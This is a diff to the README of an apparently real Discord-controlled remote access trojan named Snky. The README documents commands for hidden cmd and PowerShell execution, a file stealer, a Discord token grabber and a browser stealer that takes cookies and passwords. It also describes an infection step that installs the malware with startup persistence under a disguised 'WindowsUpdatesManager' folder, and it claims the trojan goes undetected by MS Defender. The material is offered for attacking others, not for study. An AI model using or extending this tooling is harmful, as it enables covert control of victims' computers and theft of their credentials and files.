@@ -35,20 +35,18 @@ Current commands:
 - **.monitor** - Turn the host machine's monitor on/off. Usage: ``.monitor <on/off>``
 - **.cmd** - Emulates a cmd command. No output visible. Usage: ``.cmd <cmd>``
 - **.pws** - Executes a powershell command. No output visible. ``.pws <cmd>``
-- **.file_collector** - Run a file stealer wich collects ``.txt, .docx, .pdf, .csv`` files. If enabled in it's config, also collects ``.png, .jpg, .jpeg, .web`` files, however the size may exceed max discord limit.
+- **.file_collector** - Run a file stealer wich collects ``.txt, .docx, .pdf, .csv`` files. If enabled in it's config, also collects ``.png, .jpg, .jpeg, .webp`` files, however the size may exceed max discord limit.
 - **.token_grab** - Run a discord token grabber.
 - **.browser_grab** - Run a browser stealer. Collects cookies, password, data, history and download history.
-
-This project supports custom modules. If you want to add your own script (not a command), create it and put it into the ```/modules``` folder. The bot runs these when launching itself. For reference see ```example_module.py``` in ```/modules```
 
 ## Instalation - User
 - Create a new discord bot application at https://discord.com/developers/applications.
 - Copy the token.
 - Add the bot to a server where you'll use him.
 
-- Download enc.py and paste the token into the "TOKEN_HERE" variable
+- In attacker_tools, download ``token_encoding.py`` and paste the token into the "TOKEN_HERE" variable
 - Copy the token (DO NOT COPY THE ``b'`` AT THE START AND THE ``'`` AT THE END.)
-- Paste into the powershell code in the ``$property_value`` variable.
+- Paste into the powershell code in the ``$pp`` variable.
 
 
 ## Instalation - Host
@@ -56,9 +54,16 @@ The infection process is done through the use of some powershell code. You want 
 
 The powershell code will install Python 3.10.11, latest version of Snky and create a shortcut in the startup folder. Then it restarts the computer.
 
-## Known Bugs
-- None
+The speed IS affected by network speed.
 
-## AVs that detect Snky
+## Custom Modules
+This project has custom module support! You can create your own module and then upload it into the host's computer using ``.upload C:/users/user/AppData/Local/WindowsUpdatesManager/Snky-main/modules``
+
+You can also create configs for your modules (load and use them IN YOUR MODULE). Upload them using ``.upload C:/users/user/AppData/Local/WindowsUpdatesManager/Snky-main/cfg``
+
+## Known Bugs
+- Commands with an output file are broken.
+
+## AVs that detect Snky (THAT I TESTED)
 
 - MS Defender ❌️ - Last detection: 19.1.
